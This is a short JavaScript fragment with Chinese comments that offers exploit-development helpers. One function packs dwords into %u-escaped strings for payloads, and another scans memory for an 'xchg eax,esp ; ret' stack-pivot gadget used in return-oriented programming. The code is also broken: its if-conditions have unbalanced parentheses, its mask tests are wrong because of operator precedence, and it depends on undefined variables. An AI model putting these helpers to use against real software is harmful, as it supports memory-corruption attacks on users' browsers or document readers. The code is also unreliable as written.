/**
*	漏洞利用时的 unicode 转换函数
*	2863315899   -->   0xAAAABBBB  -->  %uBBBB%uAAAA
*/

function dword2data(dword){
	var d = Number(dword).toString(16);
	while (d.length < 8 )
		d = '0' + d;
	return unescape('%u' + d.substr(4,8) + '%u' + d.substr(0,4));
}

/**
*	判定一个 Array中的 dword 是否为 xchg eax,esp # ret #
*	 search code
*/
if((this.s[me][(i-base)/4] & 0xFFFF != 0xC394){
	if((this.s[me][(i-base)/4] & 0xFFFF00 != 0xC39400){
		if((this.s[me][(i-base)/4] & 0xFFFF0000 != 0xC3940000){
			if((this.s[me][(i-base)/4] & 0xFF000000 == 0x94000000
				&& (this.s[me][(i-base)/4 + 1] & 0xFF != 0xC3){
				xchg_eax_esp = i + 3;
				break;
			}
		}
		else{
			xchg_eax_esp = i + 2;
			break;
		}
	}
	else{
		xchg_eax_esp = i + 1;
		break;
	}
}

/**
*
*	
*/